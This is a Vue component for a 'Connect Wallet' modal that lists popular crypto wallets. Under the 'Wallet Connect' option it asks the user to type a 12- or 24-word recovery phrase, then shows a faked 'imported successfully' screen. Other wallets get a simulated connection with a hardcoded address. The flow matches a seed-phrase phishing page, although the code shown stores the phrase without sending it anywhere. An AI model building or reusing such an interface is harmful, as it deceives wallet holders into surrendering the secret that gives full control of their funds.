<template>
  <teleport to="body">
    <div 
      v-if="isOpen" 
      class="fixed inset-0 z-[99999] flex items-center justify-center p-4 bg-black/95"
      @click.self="closeModal"
    >
      <div class="w-full max-w-md bg-[#0a1f14] rounded-3xl overflow-hidden border border-emerald-500/50 shadow-2xl">
        
        <!-- Header -->
        <div class="px-6 py-5 border-b border-emerald-500/30 flex justify-between items-center">
          <h2 class="text-xl font-bold text-white">Connect Wallet</h2>
          <button @click="closeModal" class="text-3xl text-gray-400 hover:text-white">×</button>
        </div>

        <!-- STEP 1: Connect -->
        <div v-if="currentStep === 'connect'" class="p-8">
          <p class="text-gray-400 text-center mb-8">Gateway to Web3</p>
          <div class="bg-[#0f2a1f] border border-emerald-500/40 rounded-2xl p-6 text-center">
            <div class="mx-auto mb-6 w-20 h-20 bg-emerald-500/10 rounded-2xl flex items-center justify-center text-5xl">
              🔐
            </div>
            <h3 class="text-2xl font-semibold text-white mb-2">Backup Wallet</h3>
            <p class="text-gray-400 mb-8">Automatic/Manual backup</p>
            <button @click="goToWallets" class="w-full py-4 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-semibold">
              Continue
            </button>
          </div>
        </div>

        <!-- STEP 2: Wallet List -->
        <div v-if="currentStep === 'wallets'" class="p-6">
          <h2 class="text-2xl font-bold text-white mb-6 text-center">Choose Wallet</h2>
          <div class="space-y-3 max-h-[460px] overflow-y-auto">
            <button 
              v-for="wallet in wallets" 
              :key="wallet.name"
              @click="selectWallet(wallet.name)" 
              class="w-full flex items-center gap-4 p-4 rounded-2xl hover:bg-[#1a3c2e] border border-transparent hover:border-emerald-500/30"
              :class="{ 'bg-[#1a3c2e] border-emerald-500': wallet.featured }"
            >
              <span class="text-2xl">{{ wallet.icon }}</span>
              <span class="text-lg font-medium text-white">{{ wallet.name }}</span>
            </button>
          </div>
        </div>

        <!-- STEP 3: Import -->
        <div v-if="currentStep === 'import'" class="p-6">
          <h3 class="text-white text-xl mb-6">Import your Wallet</h3>
          <textarea 
            v-model="recoveryPhrase" 
            rows="5"
            class="w-full bg-[#1a3c2e] border border-emerald-500/30 rounded-2xl p-5 text-white resize-none"
            placeholder="Enter your 12 or 24 word recovery phrase..."
          ></textarea>
          <p v-if="errorMessage" class="text-red-400 text-sm mt-2">{{ errorMessage }}</p>
          <div class="flex gap-3 mt-5">
            <button @click="closeModal" class="flex-1 py-4 rounded-2xl border border-gray-600 text-white hover:bg-gray-800">
              Cancel
            </button>
            <button @click="proceedImport" :disabled="isLoading" class="flex-1 py-4 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-semibold">
              {{ isLoading ? 'Processing...' : 'Proceed' }}
            </button>
          </div>
        </div>

        <!-- STEP 4: Connecting -->
        <div v-if="currentStep === 'connecting'" class="p-6 text-center">
          <div class="flex justify-center mb-6">
            <div class="relative w-20 h-20">
              <div class="absolute inset-0 border-4 border-emerald-500/30 rounded-full"></div>
              <div class="absolute inset-0 border-4 border-emerald-500 rounded-full border-t-transparent animate-spin"></div>
            </div>
          </div>
          <p class="text-gray-300 mb-2">{{ connectionStatus }}</p>
          <p class="text-sm text-gray-400">{{ selectedWallet }}</p>
        </div>

        <!-- STEP 5: Success -->
        <div v-if="currentStep === 'success'" class="p-6 text-center">
          <div class="mb-6">
            <div class="mx-auto w-20 h-20 bg-green-500/20 rounded-full flex items-center justify-center">
              <svg class="w-12 h-12 text-green-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
              </svg>
            </div>
          </div>
          <h3 class="text-2xl font-bold text-white mb-3">Connected!</h3>
          <p class="text-gray-400 mb-4">{{ connectionStatus }}</p>
          <div v-if="walletAddress" class="bg-[#1a3c2e] rounded-xl p-4 mb-6">
            <p class="text-xs text-gray-400 mb-2">Wallet Address:</p>
            <p class="text-sm text-white font-mono break-all">{{ walletAddress }}</p>
          </div>
        </div>

        <!-- STEP 6: Error -->
        <div v-if="currentStep === 'error'" class="p-6 text-center">
          <div class="mb-6">
            <div class="mx-auto w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center">
              <svg class="w-12 h-12 text-red-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
              </svg>
            </div>
          </div>
          <h3 class="text-2xl font-bold text-white mb-3">Connection Failed</h3>
          <p class="text-red-400 mb-6">{{ errorMessage }}</p>
          <div class="flex gap-3">
            <button @click="closeModal" class="flex-1 py-4 rounded-2xl border border-gray-600 text-white hover:bg-gray-800">
              Close
            </button>
            <button @click="goToWallets" class="flex-1 py-4 bg-emerald-500 hover:bg-emerald-600 rounded-2xl font-semibold">
              Try Again
            </button>
          </div>
        </div>

      </div>
    </div>
  </teleport>
</template>

<script setup>
import { ref, onMounted, onUnmounted } from 'vue'

const isOpen = ref(false)
const currentStep = ref('connect')
const selectedWallet = ref('')
const walletAddress = ref('')
const connectionStatus = ref('')
const isLoading = ref(false)
const errorMessage = ref('')
const recoveryPhrase = ref('')

const wallets = [
  { name: 'PEAKDEFI Wallet', icon: '🔷', featured: false },
  { name: 'MetaMask', icon: '🦊', featured: false },
  { name: 'Trust Wallet', icon: '💎', featured: false },
  { name: 'Wallet Connect', icon: '🔗', featured: true },
  { name: 'Phantom', icon: '👻', featured: false },
  { name: 'Coinbase Wallet', icon: '💰', featured: false },
  { name: 'Exodus', icon: '🌟', featured: false },
]

const openModal = () => {
  isOpen.value = true
  currentStep.value = 'connect'
  document.body.style.overflow = 'hidden'
}

const closeModal = () => {
  isOpen.value = false
  document.body.style.overflow = 'auto'
  resetForm()
}

const resetForm = () => {
  currentStep.value = 'connect'
  selectedWallet.value = ''
  walletAddress.value = ''
  errorMessage.value = ''
  recoveryPhrase.value = ''
  isLoading.value = false
}

const goToWallets = () => {
  currentStep.value = 'wallets'
  errorMessage.value = ''
}

const selectWallet = async (walletName) => {
  selectedWallet.value = walletName
  
  if (walletName.toLowerCase().includes('wallet connect')) {
    currentStep.value = 'import'
  } else {
    await connectWallet(walletName)
  }
}

const connectWallet = async (walletName) => {
  currentStep.value = 'connecting'
  connectionStatus.value = `Connecting to ${walletName}...`
  isLoading.value = true

  try {
    // Simulate wallet connection
    await new Promise(resolve => setTimeout(resolve, 1500))
    
    // Mock success
    walletAddress.value = '0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb'
    connectionStatus.value = 'Connected successfully!'
    currentStep.value = 'success'
    
    setTimeout(() => closeModal(), 2000)
  } catch (error) {
    handleError(error)
  } finally {
    isLoading.value = false
  }
}

const proceedImport = async () => {
  if (!recoveryPhrase.value.trim()) {
    errorMessage.value = 'Please enter your recovery phrase'
    return
  }

  const words = recoveryPhrase.value.trim().split(/\s+/)
  if (words.length !== 12 && words.length !== 24) {
    errorMessage.value = 'Recovery phrase must be 12 or 24 words'
    return
  }

  currentStep.value = 'connecting'
  connectionStatus.value = 'Importing wallet...'
  isLoading.value = true

  try {
    await new Promise(resolve => setTimeout(resolve, 1500))
    
    connectionStatus.value = 'Wallet imported successfully!'
    currentStep.value = 'success'
    
    setTimeout(() => closeModal(), 2000)
  } catch (error) {
    handleError(error)
  } finally {
    isLoading.value = false
  }
}

const handleError = (error) => {
  currentStep.value = 'error'
  errorMessage.value = error.message || 'An error occurred. Please try again.'
}

// Listen for global open event
const handleOpenEvent = () => {
  openModal()
}

onMounted(() => {
  window.addEventListener('open-wallet-modal', handleOpenEvent)
})

onUnmounted(() => {
  window.removeEventListener('open-wallet-modal', handleOpenEvent)
})
</script>